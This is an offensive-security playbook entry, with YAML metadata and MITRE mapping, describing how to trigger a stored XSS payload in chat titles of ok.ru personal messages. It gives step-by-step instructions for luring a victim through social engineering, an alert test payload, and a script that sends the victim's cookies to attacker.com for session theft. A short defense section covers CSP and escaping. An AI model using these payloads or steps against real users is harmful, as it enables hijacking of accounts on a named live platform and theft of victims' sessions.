---
id: proc-trigger-xss-okru-execution
tags:
  - xss
  - stored-xss
  - execution
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:38.386Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-Stored-XSS-Execution-in-okru-Messages

## Summary

This procedure triggers the execution of a stored JavaScript payload in the chat title of ok.ru personal messages, leading to arbitrary code execution in the victim's browser context upon accessing the affected chat.

## Description

Once a malicious payload is stored in the chat title via the injection procedure, any user viewing the personal messages page at https://ok.ru/messages will have the title rendered, executing the script. This can lead to session hijacking by stealing cookies, keylogging, or redirecting to phishing sites. The attack relies on social engineering to get the victim to open the messages, exploiting the trust in the platform's UI. Expected outcomes include client-side compromise without server interaction.

## Requirements

1. Pre-injected payload in an accessible chat.
2. Victim account that can view the chat (e.g., via invitation or shared conversation).
3. Attacker-controlled domain for exfiltration if payload includes fetches.

## Defense

Defensive measures and detection strategies:

- Enforce strict CSP headers to block unauthorized script sources.
- Use server-side rendering with auto-escaping for dynamic content.
- Log and alert on unusual browser behaviors like cross-domain requests from ok.ru.

## Objectives

1. Execute JavaScript in the victim's browser.
2. Achieve data theft or account compromise.
3. Demonstrate impact of Stored XSS.

## Instructions

### Step 1: Lure Victim

**Context**: Ensure the victim accesses the messages page containing the tainted chat.

Use social engineering, such as sending a message from the affected chat to prompt the victim to open https://ok.ru/messages.

> Victims typically open messages from contacts, increasing success rate.

### Step 2: Observe Execution

**Context**: Monitor for payload activation when the victim loads the page.

As the victim navigates to the messages, the chat title loads, parsing and executing the embedded script in their DOM.

For a test payload:

```html
<script>alert('XSS Executed!');</script>
```

> Execution occurs in the site's origin, granting access to session storage and cookies.

### Step 3: Confirm Impact

**Context**: Verify exploitation effects like data exfiltration.

If using an exfiltration payload:

```html
<script>var img = new Image(); img.src = 'http://attacker.com/steal?cookie=' + document.cookie;</script>
```

Check your server logs for incoming requests with stolen data.

> Success is indicated by network traffic or observed actions in the victim's session.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[web]]
- [[Execution]]
